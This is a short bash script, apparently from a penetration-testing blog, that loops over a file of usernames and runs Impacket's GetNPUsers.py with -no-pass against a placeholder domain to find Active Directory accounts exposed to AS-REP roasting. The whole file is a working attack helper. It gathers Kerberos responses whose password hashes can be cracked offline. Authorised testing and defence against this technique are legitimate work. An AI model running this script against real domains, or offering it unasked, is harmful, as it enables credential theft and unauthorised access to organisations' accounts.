#!/bin/bash
# popalltheshells.medium.com
# Check a list of users for AS-REP roasting vulnerability

cat uname.txt | while read LINE; do
#       echo $LINE
        GetNPUsers.py domain.local/$LINE -no-pass
done
